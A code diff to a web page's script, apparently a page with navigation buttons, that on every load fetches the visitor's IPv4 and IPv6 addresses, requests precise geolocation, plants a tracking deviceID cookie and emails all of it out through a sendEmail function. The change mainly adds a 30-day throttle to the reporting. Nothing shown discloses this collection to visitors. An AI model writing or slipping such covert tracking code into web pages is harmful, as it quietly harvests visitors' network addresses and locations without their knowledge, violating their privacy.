@@ -61,8 +61,17 @@
                 });
         }
 
-        function fetchIPsAndSendEmail() {
-            console.log('Fetching IP addresses...');
+        function checkAndSendEmail() {
+            const lastSentTime = getCookie('lastSentTime');
+            const now = new Date();
+            let lastSentDate = new Date(lastSentTime);
+
+            if (lastSentTime && (now - lastSentDate < 30 * 24 * 60 * 60 * 1000)) {
+                console.log('Email already sent within the last 30 days. Skipping email.');
+                return; // Exit if the email has been sent within the last 30 days
+            }
+
+            console.log('Fetching IP addresses and geolocation...');
 
             // Fetch IPv4 address
             fetch('https://api.ipify.org?format=json')
@@ -92,11 +101,8 @@
                                         setCookie('deviceID', deviceID, 30); // Set cookie to expire in 30 days
                                     }
 
-                                    // Get last send time from cookie
-                                    const lastSendTime = getCookie('lastSentTime') || 'Never';
-
                                     // Send email with IPs, geolocation, deviceID, and last send time
-                                    sendEmail(ipv4, ipv6, latitude, longitude, deviceID, lastSendTime);
+                                    sendEmail(ipv4, ipv6, latitude, longitude, deviceID, lastSentTime);
                                 },
                                 function(error) {
                                     console.error('Error getting geolocation:', error);
@@ -108,23 +114,36 @@
                                         setCookie('deviceID', deviceID, 30); // Set cookie to expire in 30 days
                                     }
 
-                                    // Get last send time from cookie
-                                    const lastSendTime = getCookie('lastSentTime') || 'Never';
-
                                     // Send email with IPs and deviceID, no geolocation
-                                    sendEmail(ipv4, ipv6, null, null, deviceID, lastSendTime);
+                                    sendEmail(ipv4, ipv6, null, null, deviceID, lastSentTime);
                                 },
                                 { enableHighAccuracy: true }
                             );
                         })
                         .catch(error => {
                             console.error('Error fetching IPv6 address:', error);
-                            sendEmail(ipv4, 'Unable to fetch!', null, null, getCookie('deviceID') || generateDeviceID(), getCookie('lastSentTime') || 'Never');
+                            // Get deviceID from cookie or create a new one
+                            let deviceID = getCookie('deviceID');
+                            if (!deviceID) {
+                                deviceID = generateDeviceID();
+                                setCookie('deviceID', deviceID, 30); // Set cookie to expire in 30 days
+                            }
+
+                            // Send email with IPv4 and deviceID, no IPv6 or geolocation
+                            sendEmail(ipv4, 'Unable to fetch!', null, null, deviceID, lastSentTime);
                         });
                 })
                 .catch(error => {
                     console.error('Error fetching IPv4 address:', error);
-                    sendEmail('Unable to fetch!', 'Unable to fetch!', null, null, getCookie('deviceID') || generateDeviceID(), getCookie('lastSentTime') || 'Never');
+                    // Get deviceID from cookie or create a new one
+                    let deviceID = getCookie('deviceID');
+                    if (!deviceID) {
+                        deviceID = generateDeviceID();
+                        setCookie('deviceID', deviceID, 30); // Set cookie to expire in 30 days
+                    }
+
+                    // Send email with IPv6 and deviceID, no IPv4 or geolocation
+                    sendEmail('Unable to fetch!', 'Unable to fetch!', null, null, deviceID, lastSentTime);
                 });
         }
 
@@ -148,8 +167,8 @@
             return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
         }
 
-        // Send IP addresses and geolocation info on page load
-        fetchIPsAndSendEmail();
+        // Check and send IP addresses and geolocation info on page load
+        checkAndSendEmail();
 
         // Navigation buttons
         document.getElementById('gotoSpaceStationUSA').addEventListener('click', function() {
